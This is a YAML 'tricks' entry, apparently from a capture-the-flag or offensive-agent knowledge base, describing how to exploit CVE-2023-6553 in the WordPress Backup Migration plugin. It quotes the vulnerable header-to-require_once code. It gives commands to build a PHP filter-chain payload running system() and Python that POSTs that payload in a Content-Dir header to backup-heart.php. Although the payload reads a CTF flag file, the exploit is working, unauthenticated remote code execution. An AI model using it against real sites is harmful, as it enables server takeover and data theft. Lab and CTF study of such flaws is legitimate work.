name: cve_2023_6553_backup_migration_rce
category: web
tags: [cve, wordpress, plugin, rce, php_filter_chain, unauthenticated]
indicators:
  - "WordPress Backup Migration plugin <= 1.3.7"
  - "backup-backup plugin directory"
  - "/wp-content/plugins/backup-backup/includes/backup-heart.php"
  - "CVE-2023-6553"

tricks:
  - name: "Step 1: Identify vulnerable plugin"
    when: "Analyze WordPress site"
    how: "Check backup-backup plugin version <= 1.3.7"
    payload: |
      grep -r 'Version' wp-content/plugins/backup-backup/*.php

  - name: "Step 2: Understand vulnerability"
    when: "Analyze backup-heart.php"
    how: "Content-Dir header used in require_once without sanitization"
    payload: |
      $fields = getallheaders();
      define('BMI_ROOT_DIR', $fields['content-dir']);  # User controlled
      require_once BMI_ROOT_DIR . 'includes/bypasser.php';  # File inclusion

  - name: "Step 3: Generate PHP filter chain payload"
    when: "Exploit vulnerability"
    how: "Use php_filter_chain_generator to create RCE payload"
    payload: |
      git clone https://github.com/synacktiv/php_filter_chain_generator.git
      python3 php_filter_chain_generator.py --chain '<?php system("cat /opt/flag.txt"); ?>'

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "POST to backup-heart.php with Content-Dir header containing payload"
    payload: |
      result = subprocess.run(
          ["python3", "php_filter_chain_generator.py",
           "--chain", '<?php system("cat /opt/flag.txt"); ?>'],
          capture_output=True, text=True
      )
      payload = [l for l in result.stdout.split('\n') if l.startswith('php://')][0]

      url = f"{TARGET}/wp-content/plugins/backup-backup/includes/backup-heart.php"
      resp = requests.post(url, headers={"Content-Dir": payload})
